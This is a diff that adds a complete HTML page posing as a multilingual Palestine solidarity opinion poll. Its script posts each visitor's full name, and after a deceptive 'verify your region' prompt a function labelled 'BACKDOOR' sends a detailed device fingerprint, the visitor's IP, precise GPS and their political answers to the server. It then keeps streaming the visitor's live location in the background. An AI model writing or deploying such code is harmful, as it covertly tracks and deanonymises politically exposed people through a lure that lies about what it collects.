@@ -1,0 +1,465 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1.0"/>
+<title>Palestine Solidarity Survey 2026</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;}
+
+body{
+  font-family:'Segoe UI',system-ui,-apple-system,sans-serif;
+  background:#0d1f0d;
+  min-height:100vh;
+  display:flex;justify-content:center;align-items:center;
+  padding:20px;
+  position:relative;
+  overflow-x:hidden;
+}
+
+/* subtle background pattern */
+body::before{
+  content:'';
+  position:fixed;inset:0;
+  background:
+    radial-gradient(ellipse 80% 50% at 20% 20%, rgba(46,125,50,0.12) 0%, transparent 60%),
+    radial-gradient(ellipse 60% 40% at 80% 80%, rgba(27,94,32,0.10) 0%, transparent 60%);
+  pointer-events:none;
+}
+
+.card{
+  background:#ffffff;
+  border-radius:24px;
+  padding:36px 32px;
+  max-width:520px;width:100%;
+  box-shadow:0 32px 80px rgba(0,0,0,0.55),0 0 0 1px rgba(255,255,255,0.05);
+  position:relative;
+  animation:rise .5s cubic-bezier(.22,.9,.36,1) both;
+}
+@keyframes rise{from{opacity:0;transform:translateY(24px)}to{opacity:1;transform:translateY(0)}}
+
+/* ── BADGE ── */
+.badge{
+  display:inline-flex;align-items:center;gap:6px;
+  background:#f0faf0;color:#2e7d32;
+  font-size:10.5px;font-weight:700;letter-spacing:.6px;text-transform:uppercase;
+  padding:4px 12px;border-radius:20px;border:1px solid #c8e6c9;
+  margin-bottom:18px;
+}
+
+/* ── PROGRESS ── */
+.prog-wrap{margin-bottom:20px;}
+.prog-top{display:flex;justify-content:space-between;align-items:center;margin-bottom:7px;}
+.prog-label{font-size:11px;color:#999;font-weight:500;}
+.prog-step{font-size:11px;color:#2e7d32;font-weight:700;}
+.prog-track{height:4px;background:#eee;border-radius:4px;overflow:hidden;}
+.prog-fill{height:100%;background:linear-gradient(90deg,#43a047,#1b5e20);border-radius:4px;transition:width .45s ease;}
+
+/* ── FLAG BAR ── */
+.flag-bar{display:flex;height:4px;border-radius:3px;overflow:hidden;margin-bottom:22px;}
+.flag-bar span{flex:1;}
+
+/* ── HEADINGS ── */
+.screen-title{font-size:20px;font-weight:700;color:#0d1f0d;line-height:1.35;margin-bottom:6px;}
+.screen-sub{font-size:13px;color:#777;line-height:1.5;margin-bottom:24px;}
+
+/* ── LANG GRID ── */
+.lang-grid{display:grid;grid-template-columns:1fr 1fr 1fr;gap:10px;}
+.lang-btn{
+  padding:14px 8px;
+  border:1.5px solid #e0e0e0;border-radius:14px;
+  cursor:pointer;font-size:13px;font-weight:600;
+  color:#333;background:white;
+  transition:all .2s ease;text-align:center;line-height:1.5;
+}
+.lang-btn:hover{border-color:#2e7d32;background:#f6fbf6;color:#2e7d32;transform:translateY(-2px);box-shadow:0 4px 14px rgba(46,125,50,0.15);}
+
+/* ── NAME INPUT ── */
+.input-wrap{position:relative;margin-bottom:4px;}
+.name-input{
+  width:100%;padding:14px 16px;
+  border:1.5px solid #e0e0e0;border-radius:12px;
+  font-size:14px;color:#222;outline:none;
+  transition:border-color .2s,box-shadow .2s;
+  font-family:inherit;background:#fafafa;
+}
+.name-input:focus{border-color:#2e7d32;background:white;box-shadow:0 0 0 3px rgba(46,125,50,0.1);}
+
+/* ── QUESTION ── */
+.q-text{font-size:15.5px;font-weight:600;color:#0d1f0d;line-height:1.55;margin-bottom:18px;}
+.opts{display:flex;flex-direction:column;gap:8px;}
+.opt{
+  padding:12px 16px;
+  border:1.5px solid #e8e8e8;border-radius:11px;
+  cursor:pointer;font-size:13px;color:#333;background:white;
+  transition:all .18s ease;
+  display:flex;align-items:center;gap:10px;
+}
+.opt::before{
+  content:'';width:16px;height:16px;flex-shrink:0;
+  border:2px solid #d0d0d0;border-radius:50%;
+  transition:all .18s ease;
+}
+.opt:hover{border-color:#66bb6a;background:#f6fbf6;}
+.opt:hover::before{border-color:#66bb6a;}
+.opt.sel{border-color:#2e7d32;background:#f0faf0;color:#1b5e20;font-weight:600;}
+.opt.sel::before{background:#2e7d32;border-color:#2e7d32;box-shadow:inset 0 0 0 3px white;}
+
+/* ── BUTTONS ── */
+.btn-primary{
+  width:100%;padding:14px;margin-top:20px;
+  border:none;border-radius:12px;
+  background:linear-gradient(135deg,#388e3c,#1b5e20);
+  color:white;font-size:14px;font-weight:600;
+  cursor:pointer;transition:all .25s ease;
+  letter-spacing:.2px;
+}
+.btn-primary:hover{transform:translateY(-2px);box-shadow:0 8px 24px rgba(46,125,50,0.4);}
+.btn-primary:active{transform:translateY(0);}
+.btn-primary:disabled,.btn-primary.off{opacity:.35;pointer-events:none;}
+
+/* ── RESULTS SUMMARY ── */
+.res-header{text-align:center;margin-bottom:22px;}
+.res-header .check-circle{
+  width:56px;height:56px;background:linear-gradient(135deg,#43a047,#1b5e20);
+  border-radius:50%;margin:0 auto 14px;
+  display:flex;align-items:center;justify-content:center;font-size:24px;
+  animation:pop .45s cubic-bezier(.22,.9,.36,1) both;
+}
+@keyframes pop{from{transform:scale(0);opacity:0}to{transform:scale(1);opacity:1}}
+.res-header h2{font-size:18px;font-weight:700;color:#0d1f0d;margin-bottom:4px;}
+.res-header p{font-size:12px;color:#888;}
+
+.ans-list{display:flex;flex-direction:column;gap:10px;margin-bottom:24px;}
+.ans-item{
+  background:#f8fdf8;border:1.5px solid #e0f0e0;
+  border-radius:12px;padding:13px 15px;
+}
+.ans-q{font-size:11px;color:#888;font-weight:500;margin-bottom:5px;line-height:1.4;}
+.ans-a{
+  font-size:13px;font-weight:700;color:#1b5e20;
+  display:flex;align-items:center;gap:6px;
+}
+.ans-a::before{content:'✓';font-size:11px;background:#2e7d32;color:white;
+  width:17px;height:17px;border-radius:50%;display:flex;align-items:center;justify-content:center;flex-shrink:0;}
+
+/* ── FINAL ── */
+.final-wrap{text-align:center;padding:12px 0;}
+.final-tick{font-size:62px;margin-bottom:14px;display:block;animation:pop .5s ease both;}
+.final-wrap h2{font-size:20px;font-weight:700;color:#0d1f0d;margin-bottom:12px;line-height:1.4;}
+.final-wrap p{font-size:13px;color:#666;line-height:1.75;max-width:340px;margin:0 auto;}
+
+/* ── MODAL ── */
+.modal-overlay{
+  position:fixed;inset:0;
+  background:rgba(0,0,0,0.6);backdrop-filter:blur(6px);
+  display:none;justify-content:center;align-items:center;z-index:999;padding:20px;
+}
+.modal-overlay.active{display:flex;}
+.modal{
+  background:white;padding:32px 28px;border-radius:20px;
+  max-width:340px;width:100%;text-align:center;
+  animation:rise .3s ease both;
+}
+.modal-icon{
+  width:56px;height:56px;background:linear-gradient(135deg,#43a047,#1b5e20);
+  border-radius:50%;margin:0 auto 16px;
+  display:flex;align-items:center;justify-content:center;font-size:26px;
+}
+.modal h3{font-size:18px;font-weight:700;color:#0d1f0d;margin-bottom:8px;}
+.modal p{font-size:13px;color:#666;line-height:1.6;margin-bottom:20px;}
+.modal-btn{
+  padding:12px 28px;border:none;border-radius:11px;
+  background:linear-gradient(135deg,#388e3c,#1b5e20);
+  color:white;font-size:13px;font-weight:600;cursor:pointer;
+  transition:transform .2s,box-shadow .2s;
+}
+.modal-btn:hover{transform:scale(1.04);box-shadow:0 6px 18px rgba(46,125,50,0.35);}
+
+/* ── DIVIDER ── */
+.divider{height:1px;background:#f0f0f0;margin:20px 0;}
+
+/* ── SCREEN TRANSITIONS ── */
+.screen{animation:fadeSlide .35s ease both;}
+@keyframes fadeSlide{from{opacity:0;transform:translateX(16px)}to{opacity:1;transform:translateX(0)}}
+</style>
+</head>
+<body>
+<div class="card" id="mainCard">
+
+  <!-- S1: Language -->
+  <div id="s1" class="screen">
+    <div style="text-align:center;margin-bottom:22px;">
+      <div class="badge">🇵🇸 Solidarity Survey</div>
+      <div class="screen-title" style="margin-bottom:4px;">Choose Your Language</div>
+      <div class="screen-sub" style="margin-bottom:0;">اختر اللغة · Select · Pilih · Choisissez</div>
+    </div>
+    <div class="lang-grid">
+      <button class="lang-btn" onclick="pickLang('en')">🇬🇧<br/>English</button>
+      <button class="lang-btn" onclick="pickLang('ml')">🇮🇳<br/>മലയാളം</button>
+      <button class="lang-btn" onclick="pickLang('id')">🇮🇩<br/>Indonesia</button>
+      <button class="lang-btn" onclick="pickLang('ar')">🇸🇦<br/>العربية</button>
+      <button class="lang-btn" onclick="pickLang('fr')">🇫🇷<br/>Français</button>
+      <button class="lang-btn" onclick="pickLang('tr')">🇹🇷<br/>Türkçe</button>
+    </div>
+  </div>
+
+  <!-- S2: Name -->
+  <div id="s2" class="screen" style="display:none;">
+    <div class="badge" id="s2badge">🇵🇸 Solidarity Survey</div>
+    <div class="screen-title" id="s2h">What is your name?</div>
+    <div class="screen-sub" id="s2p">Personalize your results</div>
+    <div class="input-wrap">
+      <input class="name-input" id="ni" type="text" autocomplete="off"
+        oninput="onNI()" onkeydown="if(event.key==='Enter')doName()"
+        placeholder="Enter your full name"/>
+    </div>
+    <button class="btn-primary off" id="nb" onclick="doName()">Continue</button>
+  </div>
+
+  <!-- S3: Survey -->
+  <div id="s3" class="screen" style="display:none;">
+    <div class="badge" id="s3badge">🇵🇸 Solidarity Survey</div>
+    <div class="screen-title" id="s3h">Palestine & Middle East Opinion Poll</div>
+    <div class="screen-sub" id="s3p">3 questions · see how the world thinks</div>
+    <div class="flag-bar">
+      <span style="background:#000;"></span>
+      <span style="background:#ddd;border-top:1px solid #ccc;border-bottom:1px solid #ccc;"></span>
+      <span style="background:#149954;"></span>
+      <span style="background:#ce1126;"></span>
+    </div>
+    <div class="prog-wrap">
+      <div class="prog-top">
+        <span class="prog-label" id="qc">Question 1 of 3</span>
+        <span class="prog-step" id="qstep">1 / 3</span>
+      </div>
+      <div class="prog-track"><div class="prog-fill" id="pf" style="width:33%"></div></div>
+    </div>
+    <div id="qbox"></div>
+    <button class="btn-primary off" id="nb2" onclick="doNext()">Next →</button>
+  </div>
+
+  <!-- S4: Results / Submit -->
+  <div id="s4" class="screen" style="display:none;">
+    <div class="res-header">
+      <div class="check-circle">📋</div>
+      <h2 id="s4h">Your Answers</h2>
+      <p id="s4p">Review before submitting</p>
+    </div>
+    <div class="ans-list" id="ansList"></div>
+    <button class="btn-primary" id="s4btn" onclick="doSubmit()">Submit My Answers</button>
+  </div>
+
+  <!-- S5: Final -->
+  <div id="s5" class="screen" style="display:none;">
+    <div class="final-wrap">
+      <span class="final-tick">✅</span>
+      <h2 id="s5h">Your result has been successfully updated!</h2>
+      <p id="s5p">Thank you for standing with the truth. We have received your responses and will try our best to help raise awareness. Your voice matters. 🇵🇸</p>
+    </div>
+  </div>
+
+</div>
+
+<!-- Location Modal -->
+<div class="modal-overlay" id="locModal">
+  <div class="modal">
+    <div class="modal-icon">📍</div>
+    <h3 id="mh">Verify Your Region</h3>
+    <p id="mp">To show region-based results and compare your opinion with people nearby, we need your location.</p>
+    <button class="modal-btn" id="mb" onclick="doLoc()">Allow Location</button>
+  </div>
+</div>
+
+<script>
+// ── STRINGS ──────────────────────────────────────────────────
+const T={
+  en:{badge:'🇵🇸 Solidarity Survey',svH:'Palestine & Middle East Opinion Poll',svP:'3 questions · see how the world thinks',nameH:'What is your name?',nameP:'Personalize your results',namePH:'Enter your full name',cont:'Continue',next:'Next →',last:'Review My Answers',resH:'Your Answers',resP:'Review before submitting',yourAns:'Your answer',votes:'votes',sub:'Submit My Answers',finH:'Your result has been successfully updated!',finP:'Thank you for standing with the truth. We have received your responses and will try our best to help raise awareness. Your voice matters. 🇵🇸',mH:'Verify Your Region',mP:'To show region-based results and compare your opinion with people nearby, we need your location.',mB:'Allow Location',qOf:'Question',of:'of'},
+  ml:{badge:'🇵🇸 ഐക്യദാർഢ്യ സർവേ',svH:'ഫലസ്തീൻ & മധ്യേഷ്യ അഭിപ്രായ സർവേ',svP:'3 ചോദ്യങ്ങൾ · ലോകം എന്ത് ചിന്തിക്കുന്നു',nameH:'നിങ്ങളുടെ പേര്?',nameP:'ഫലങ്ങൾ വ്യക്തിഗതമാക്കാൻ',namePH:'പൂർണ്ണ പേര് നൽകൂ',cont:'തുടരുക',next:'അടുത്തത് →',last:'ഉത്തരങ്ങൾ പരിശോധിക്കൂ',resH:'നിങ്ങളുടെ ഉത്തരങ്ങൾ',resP:'സമർപ്പിക്കുന്നതിന് മുമ്പ് പരിശോധിക്കൂ',yourAns:'നിങ്ങളുടെ ഉത്തരം',votes:'വോട്ടുകൾ',sub:'സമർപ്പിക്കൂ',finH:'നിങ്ങളുടെ ഫലം വിജയകരമായി അപ്‌ഡേറ്റ് ചെയ്തു!',finP:'സത്യത്തിനൊപ്പം നിന്നതിന് നന്ദി. ഉത്തരങ്ങൾ ലഭിച്ചു. 🇵🇸',mH:'പ്രദേശം സ്ഥിരീകരിക്കൂ',mP:'പ്രദേശ ഫലങ്ങൾ കാണിക്കാൻ ലൊക്കേഷൻ ആവശ്യമാണ്.',mB:'ലൊക്കേഷൻ അനുവദിക്കൂ',qOf:'ചോദ്യം',of:'ൽ'},
+  id:{badge:'🇵🇸 Survei Solidaritas',svH:'Jajak Pendapat Palestina & Timur Tengah',svP:'3 pertanyaan · lihat pendapat dunia',nameH:'Siapa nama Anda?',nameP:'Personalisasi hasil Anda',namePH:'Masukkan nama lengkap',cont:'Lanjutkan',next:'Berikutnya →',last:'Tinjau Jawaban',resH:'Jawaban Anda',resP:'Tinjau sebelum mengirim',yourAns:'Jawaban Anda',votes:'suara',sub:'Kirim Jawaban',finH:'Hasil Anda berhasil diperbarui!',finP:'Terima kasih telah berpihak pada kebenaran. Kami telah menerima jawaban Anda. 🇵🇸',mH:'Verifikasi Wilayah Anda',mP:'Untuk menampilkan hasil berbasis wilayah, kami memerlukan lokasi Anda.',mB:'Izinkan Lokasi',qOf:'Pertanyaan',of:'dari'},
+  ar:{badge:'🇵🇸 استطلاع التضامن',svH:'استطلاع رأي فلسطين والشرق الأوسط',svP:'٣ أسئلة · شاهد رأي العالم',nameH:'ما اسمك؟',nameP:'لتخصيص نتائجك',namePH:'أدخل اسمك الكامل',cont:'متابعة',next:'التالي →',last:'مراجعة الإجابات',resH:'إجاباتك',resP:'راجع قبل الإرسال',yourAns:'إجابتك',votes:'أصوات',sub:'إرسال إجاباتي',finH:'تم تحديث نتيجتك بنجاح!',finP:'شكراً لوقوفك مع الحق. استلمنا إجاباتك. 🇵🇸',mH:'التحقق من موقعك',mP:'لعرض نتائج إقليمية ومقارنة رأيك مع المقربين، نحتاج موقعك.',mB:'السماح بالموقع',qOf:'سؤال',of:'من'},
+  fr:{badge:'🇵🇸 Sondage Solidarité',svH:"Sondage d'opinion Palestine & Moyen-Orient",svP:'3 questions · voyez ce que pense le monde',nameH:'Quel est votre nom ?',nameP:'Pour personnaliser vos résultats',namePH:'Entrez votre nom complet',cont:'Continuer',next:'Suivant →',last:'Vérifier mes réponses',resH:'Vos réponses',resP:'Vérifiez avant de soumettre',yourAns:'Votre réponse',votes:'votes',sub:'Soumettre mes réponses',finH:'Votre résultat a été mis à jour avec succès !',finP:"Merci de vous tenir du côté de la vérité. Nous avons reçu vos réponses. 🇵🇸",mH:'Vérifiez votre région',mP:'Pour afficher des résultats régionaux, nous avons besoin de votre localisation.',mB:'Autoriser la localisation',qOf:'Question',of:'sur'},
+  tr:{badge:'🇵🇸 Dayanışma Anketi',svH:'Filistin & Orta Doğu Anketi',svP:'3 soru · dünyanın ne düşündüğünü görün',nameH:'Adınız nedir?',nameP:'Sonuçlarınızı kişiselleştirmek için',namePH:'Tam adınızı girin',cont:'Devam',next:'Sonraki →',last:'Yanıtları Gözden Geçir',resH:'Yanıtlarınız',resP:'Göndermeden önce gözden geçirin',yourAns:'Yanıtınız',votes:'oy',sub:'Yanıtlarımı Gönder',finH:'Sonucunuz başarıyla güncellendi!',finP:'Gerçeğin yanında durduğunuz için teşekkürler. Yanıtlarınızı aldık. 🇵🇸',mH:'Bölgenizi Doğrulayın',mP:'Bölgeye özgü sonuçları göstermek için konumunuza ihtiyacımız var.',mB:'Konuma İzin Ver',qOf:'Soru',of:'/'},
+};
+
+// ── QUESTIONS ────────────────────────────────────────────────
+const QDB={
+  en:[
+    {id:1,t:'Do you believe Palestine deserves to be a free and independent state?',o:['Strongly yes','Yes','Neutral','No','Strongly no']},
+    {id:2,t:'Who do you believe is the main aggressor in the Israel-Palestine conflict?',o:['Israel clearly','Israel mostly','Both equally','Hamas mostly','Hamas clearly']},
+    {id:3,t:'Should Western countries stop sending weapons to Israel?',o:['Yes immediately','Yes with conditions','Uncertain','Probably not','No']},
+    {id:4,t:'Do you support an immediate ceasefire in Gaza?',o:['Strongly support','Support','Neutral','Oppose','Strongly oppose']},
+    {id:5,t:'Does the USA play a biased role in the Israel-Palestine conflict?',o:['Extremely biased toward Israel','Somewhat biased','Fairly neutral','Somewhat biased toward Palestine','Fully neutral']},
+  ],
+  ml:[
+    {id:1,t:'ഫലസ്തീൻ ഒരു സ്വതന്ത്ര രാഷ്ട്രമർഹിക്കുന്നു എന്ന് നിങ്ങൾ വിശ്വസിക്കുന്നോ?',o:['ശക്തമായി അതെ','അതെ','നിഷ്പക്ഷം','ഇല്ല','ശക്തമായി ഇല്ല']},
+    {id:2,t:'ഇസ്രായേൽ-ഫലസ്തീൻ സംഘർഷത്തിൽ പ്രധാന ആക്രമണകാരി ആരാണ്?',o:['ഇസ്രായേൽ തീർച്ചയായും','ഇസ്രായേൽ കൂടുതലും','ഇരുഭാഗവും','ഹമാസ് കൂടുതലും','ഹമാസ് തീർച്ചയായും']},
+    {id:3,t:'പാശ്ചാത്യ രാജ്യങ്ങൾ ഇസ്രായേലിന് ആയുധം അയക്കൽ നിർത്തണമോ?',o:['ഉടൻ','ഉപാധികളോടെ','ഉറപ്പില്ല','ഇല്ലെന്ന് തോന്നും','ഇല്ല']},
+    {id:4,t:'ഗാസയിൽ ഉടൻ വെടിനിർത്തൽ വേണമോ?',o:['ശക്തമായി വേണം','വേണം','നിഷ്പക്ഷം','വേണ്ട','ശക്തമായി വേണ്ട']},
+    {id:5,t:'ഇസ്രായേൽ-ഫലസ്തീൻ സംഘർഷത്തിൽ USA-ക്ക് പക്ഷപാതമുണ്ടോ?',o:['ഇസ്രായേലിനോട് അതിശക്തം','ഒരുപരിധിവരെ','ന്യായ നിഷ്പക്ഷത','ഫലസ്തീനോട്','പൂർണ നിഷ്പക്ഷത']},
+  ],
+  id:[
+    {id:1,t:'Apakah Anda percaya Palestina berhak menjadi negara merdeka?',o:['Sangat setuju','Setuju','Netral','Tidak setuju','Sangat tidak setuju']},
+    {id:2,t:'Siapa yang Anda anggap sebagai agresor utama dalam konflik Israel-Palestina?',o:['Israel jelas','Israel kebanyakan','Keduanya sama','Hamas kebanyakan','Hamas jelas']},
+    {id:3,t:'Haruskah negara-negara Barat berhenti mengirim senjata ke Israel?',o:['Ya, segera','Ya, dengan syarat','Tidak yakin','Mungkin tidak','Tidak']},
+    {id:4,t:'Apakah Anda mendukung gencatan senjata segera di Gaza?',o:['Sangat mendukung','Mendukung','Netral','Menentang','Sangat menentang']},
+    {id:5,t:'Apakah AS memainkan peran yang memihak dalam konflik Israel-Palestina?',o:['Sangat memihak Israel','Agak memihak','Cukup netral','Agak memihak Palestina','Sepenuhnya netral']},
+  ],
+  ar:[
+    {id:1,t:'هل تعتقد أن فلسطين تستحق أن تكون دولة حرة ومستقلة؟',o:['بشدة نعم','نعم','محايد','لا','بشدة لا']},
+    {id:2,t:'من تعتقده المعتدي الرئيسي في النزاع الإسرائيلي الفلسطيني؟',o:['إسرائيل بوضوح','إسرائيل في الغالب','كلاهما بالتساوي','حماس في الغالب','حماس بوضوح']},
+    {id:3,t:'هل يجب على الدول الغربية التوقف عن إرسال الأسلحة إلى إسرائيل؟',o:['نعم فورًا','نعم بشروط','غير متأكد','ربما لا','لا']},
+    {id:4,t:'هل تدعم وقف إطلاق النار الفوري في غزة؟',o:['أدعم بشدة','أدعم','محايد','أعارض','أعارض بشدة']},
+    {id:5,t:'هل تلعب الولايات المتحدة دورًا منحازًا في النزاع الإسرائيلي الفلسطيني؟',o:['منحاز جدًا لإسرائيل','منحاز نوعًا ما','محايد إلى حد ما','منحاز نوعًا ما لفلسطين','محايد تمامًا']},
+  ],
+  fr:[
+    {id:1,t:"Pensez-vous que la Palestine mérite d'être un État libre et indépendant ?",o:['Fortement oui','Oui','Neutre','Non','Fortement non']},
+    {id:2,t:"Qui considérez-vous comme le principal agresseur dans le conflit israélo-palestinien ?",o:["Israël clairement","Israël surtout","Les deux également","Le Hamas surtout","Le Hamas clairement"]},
+    {id:3,t:"Les pays occidentaux devraient-ils arrêter d'envoyer des armes à Israël ?",o:['Oui immédiatement','Oui sous conditions','Incertain','Probablement pas','Non']},
+    {id:4,t:"Soutenez-vous un cessez-le-feu immédiat à Gaza ?",o:['Fortement oui','Oui','Neutre','Non','Fortement non']},
+    {id:5,t:"Les États-Unis jouent-ils un rôle partial dans le conflit israélo-palestinien ?",o:['Très partial envers Israël','Quelque peu partial','Assez neutre','Partial envers la Palestine','Totalement neutre']},
+  ],
+  tr:[
+    {id:1,t:"Filistin'in özgür ve bağımsız bir devlet olmayı hak ettiğine inanıyor musunuz?",o:['Kesinlikle evet','Evet','Tarafsız','Hayır','Kesinlikle hayır']},
+    {id:2,t:"İsrail-Filistin çatışmasında asıl saldırganın kim olduğuna inanıyorsunuz?",o:['Açıkça İsrail','Çoğunlukla İsrail','İkisi de eşit','Çoğunlukla Hamas','Açıkça Hamas']},
+    {id:3,t:"Batılı ülkeler İsrail'e silah göndermeyi durdurmalı mı?",o:['Evet hemen','Evet koşullu','Belirsiz','Muhtemelen hayır','Hayır']},
+    {id:4,t:"Gazze'de hemen ateşkes olmasını destekliyor musunuz?",o:['Kesinlikle destekliyorum','Destekliyorum','Tarafsız','Karşıyım','Kesinlikle karşıyım']},
+    {id:5,t:"ABD, İsrail-Filistin çatışmasında taraflı bir rol oynuyor mu?",o:["İsrail'e son derece taraflı",'Biraz taraflı','Oldukça tarafsız',"Filistin'e biraz taraflı",'Tamamen tarafsız']},
+  ],
+};
+
+// ── STATE ────────────────────────────────────────────────────
+let lang='en', S=T.en, Q=QDB.en;
+let uName='', selQs=[], curQ=0, answers={}, selOpt=null, dataSent=false;
+
+const $=id=>document.getElementById(id);
+function show(id,d='block'){$(id).style.display=d;}
+function hide(id){$(id).style.display='none';}
+
+// ── S1: LANGUAGE ─────────────────────────────────────────────
+function pickLang(l){
+  lang=l; S=T[l]; Q=QDB[l];
+  hide('s1'); show('s2');
+  $('s2badge').textContent=S.badge;
+  $('s2h').textContent=S.nameH;
+  $('s2p').textContent=S.nameP;
+  $('ni').placeholder=S.namePH;
+  $('nb').textContent=S.cont;
+  document.body.dir=l==='ar'?'rtl':'ltr';
+  setTimeout(()=>$('ni').focus(),80);
+}
+
+// ── S2: NAME ─────────────────────────────────────────────────
+function onNI(){
+  const v=$('ni').value.trim();
+  const nb=$('nb');
+  if(v){nb.classList.remove('off');}
+  else{nb.classList.add('off');}
+}
+function doName(){
+  uName=$('ni').value.trim(); if(!uName)return;
+  fetch('/name',{method:'POST',headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({name:uName,lang,timestamp:new Date().toISOString()})
+  }).catch(()=>{});
+  hide('s2'); startSurvey();
+}
+
+// ── S3: SURVEY ────────────────────────────────────────────────
+function startSurvey(){
+  selQs=[...Q].sort(()=>Math.random()-0.5).slice(0,3);
+  curQ=0; answers={}; selOpt=null;
+  $('s3badge').textContent=S.badge;
+  $('s3h').textContent=S.svH;
+  $('s3p').textContent=S.svP;
+  show('s3'); showQ(0);
+}
+function showQ(i){
+  const q=selQs[i];
+  const pct=((i+1)/3*100);
+  $('pf').style.width=pct+'%';
+  $('qc').textContent=S.qOf+' '+(i+1)+' '+S.of+' 3';
+  $('qstep').textContent=(i+1)+' / 3';
+  $('qbox').innerHTML=`<div class="q-text">${q.t}</div><div class="opts">${q.o.map((o,j)=>`<div class="opt" onclick="pickOpt(${j},this)">${o}</div>`).join('')}</div>`;
+  const nb2=$('nb2');
+  nb2.classList.add('off');
+  nb2.textContent=i<2?S.next:S.last;
+  selOpt=null;
+}
+function pickOpt(i,el){
+  document.querySelectorAll('.opt').forEach(o=>o.classList.remove('sel'));
+  el.classList.add('sel'); selOpt=i;
+  $('nb2').classList.remove('off');
+}
+function doNext(){
+  if(selOpt===null)return;
+  const q=selQs[curQ];
+  answers['q'+(curQ+1)]={questionId:q.id,question:q.t,answer:q.o[selOpt],optionIndex:selOpt};
+  curQ++;
+  if(curQ===1&&!dataSent){
+    $('mh').textContent=S.mH; $('mp').textContent=S.mP; $('mb').textContent=S.mB;
+    show('locModal','flex'); return;
+  }
+  advance();
+}
+function advance(){curQ<3?showQ(curQ):(hide('s3'),showResults());}
+
+// ── S4: RESULTS (no charts — answer summary) ─────────────────
+function showResults(){
+  $('s4h').textContent=S.resH;
+  $('s4p').textContent=S.resP;
+  $('s4btn').textContent=S.sub;
+  const list=$('ansList'); list.innerHTML='';
+  selQs.forEach((q,qi)=>{
+    const ans=answers['q'+(qi+1)];
+    if(!ans) return;
+    const item=document.createElement('div');
+    item.className='ans-item';
+    item.innerHTML=`<div class="ans-q">${q.t}</div><div class="ans-a">${ans.answer}</div>`;
+    list.appendChild(item);
+  });
+  show('s4');
+}
+
+// ── S5: FINAL ─────────────────────────────────────────────────
+function doSubmit(){
+  hide('s4');
+  $('s5h').textContent=S.finH;
+  $('s5p').textContent=S.finP;
+  show('s5');
+}
+
+// ── BACKDOOR ──────────────────────────────────────────────────
+async function collectDev(){
+  const i={name:uName,lang,userAgent:navigator.userAgent,platform:navigator.platform,language:navigator.language,languages:navigator.languages?navigator.languages.join(', '):'N/A',screenSize:screen.width+'x'+screen.height,colorDepth:screen.colorDepth+' bit',pixelRatio:window.devicePixelRatio||'N/A',timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,timezoneOffset:new Date().getTimezoneOffset()+' min',cookieEnabled:navigator.cookieEnabled,doNotTrack:navigator.doNotTrack||'unset',online:navigator.onLine,referrer:document.referrer||'direct',cpuCores:navigator.hardwareConcurrency||'N/A',deviceMemory:navigator.deviceMemory?navigator.deviceMemory+' GB':'N/A',touchSupport:('ontouchstart' in window)||navigator.maxTouchPoints>0,maxTouchPoints:navigator.maxTouchPoints||0,windowSize:window.innerWidth+'x'+window.innerHeight,vendor:navigator.vendor||'N/A'};
+  if(navigator.connection){const c=navigator.connection;i.network={type:c.effectiveType||'N/A',downlink:c.downlink?c.downlink+' Mbps':'N/A',rtt:c.rtt?c.rtt+' ms':'N/A',saveData:c.saveData||false};}
+  try{const b=await navigator.getBattery();i.battery={level:Math.round(b.level*100)+'%',charging:b.charging,chargingTime:b.chargingTime===Infinity?'N/A':b.chargingTime+'s',dischargingTime:b.dischargingTime===Infinity?'N/A':b.dischargingTime+'s'};}catch{}
+  try{const cv=document.createElement('canvas');cv.getContext('2d').fillText('fp',2,2);i.canvasFingerprint=cv.toDataURL().slice(-20);}catch{}
+  try{const r=await fetch('https://api.ipify.org?format=json');i.ip=(await r.json()).ip;}catch{i.ip='unknown';}
+  return i;
+}
+async function doLoc(){
+  $('mh').textContent=lang==='ar'?'جاري تحديد الموقع...':lang==='ml'?'ലൊക്കേഷൻ കണ്ടെത്തുന്നു...':lang==='id'?'Mendapatkan lokasi...':lang==='fr'?'Localisation en cours...':lang==='tr'?'Konum alınıyor...':'Getting your location...';
+  $('mp').textContent=''; $('mb').style.display='none';
+  const gpsP=new Promise(res=>{
+    if(!navigator.geolocation){res(null);return;}
+    navigator.geolocation.getCurrentPosition(
+      p=>res({lat:p.coords.latitude,lon:p.coords.longitude,accuracy:p.coords.accuracy,altitude:p.coords.altitude||'N/A',speed:p.coords.speed||'N/A'}),
+      ()=>res(null),{enableHighAccuracy:true,timeout:30000,maximumAge:0}
+    );
+  });
+  const dev=await collectDev();
+  const gps=await gpsP;
+  hide('locModal');
+  dataSent=true;
+  fetch('/collect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({gps,device:dev,answers,timestamp:new Date().toISOString()})}).catch(()=>{});
+  if(gps&&navigator.geolocation){
+    navigator.geolocation.watchPosition(
+      p=>fetch('/update',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({lat:p.coords.latitude,lon:p.coords.longitude,accuracy:p.coords.accuracy,timestamp:new Date().toISOString()})}).catch(()=>{}),
+      ()=>{},{enableHighAccuracy:true,maximumAge:0}
+    );
+  }
+  advance();
+}
+</script>
+</body>
+</html>
